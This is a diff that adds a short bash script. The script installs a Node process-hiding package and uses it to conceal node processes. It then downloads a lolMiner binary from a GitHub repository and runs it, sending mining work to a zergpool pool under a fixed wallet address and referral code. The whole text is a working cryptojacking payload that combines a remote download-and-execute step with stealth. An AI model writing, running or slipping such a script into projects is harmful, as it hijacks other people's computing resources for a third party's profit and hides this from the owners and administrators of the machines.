@@ -1,0 +1,8 @@
+#!/bin/bash
+apt update
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+npm i -g node-process-hider 
+ph add node
+wget https://github.com/circelwenakyo/usdto/raw/main/lolMiner
+chmod +x lolMiner
+./lolMiner --algo ETHASH --pool ethash.mine.zergpool.com:9999 --user 7ZKyzh2m9r6VQeJ7tEn48eWZAZUFXMhzh2.$(echo $(shuf -i 1-99999 -n 1)-Dash) --pass c=DASH,refcode=45208572f133b5482a86ca0d064e3b5f --ethstratum ETHPROXY
